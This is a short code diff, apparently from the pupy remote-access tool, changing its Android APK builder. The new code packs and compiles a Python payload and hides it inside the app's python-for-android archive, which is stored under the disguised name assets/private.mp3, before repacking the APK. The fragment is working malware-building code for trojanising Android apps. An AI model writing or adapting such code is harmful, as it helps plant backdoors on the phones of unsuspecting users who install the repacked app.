@@ -109,7 +109,7 @@ def updateTar(arcpath, arcname, file_path):
 def get_edit_apk(path, new_path, conf):
 	tempdir=tempfile.mkdtemp(prefix="tmp_pupy_")
 	try:
-		new_conf=get_raw_conf(conf)
+		packed_payload=pack_py_payload(get_raw_conf(conf))
 		shutil.copy(path, new_path)
 
 		#extracting the python-for-android install tar from the apk
@@ -117,12 +117,14 @@ def get_edit_apk(path, new_path, conf):
 		zf.extract("assets/private.mp3", tempdir)
 		zf.close()
 
-		with open(os.path.join(tempdir,"pp.conf"),'w') as w:
-			w.write(new_conf)
+		with open(os.path.join(tempdir,"pp.py"),'w') as w:
+			w.write(packed_payload)
+		import py_compile
+		py_compile.compile(os.path.join(tempdir, "pp.py"), os.path.join(tempdir, "pp.pyo"))
 
 		print "[+] packaging the apk ... (can take 10-20 seconds)"
 		#updating the tar with the new config
-		updateTar(os.path.join(tempdir,"assets/private.mp3"), "service/pp.conf", os.path.join(tempdir,"pp.conf"))
+		updateTar(os.path.join(tempdir,"assets/private.mp3"), "service/pp.pyo", os.path.join(tempdir,"pp.pyo"))
 		#repacking the tar in the apk
 		with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
 			updateZip(new_path, "assets/private.mp3", t.read())
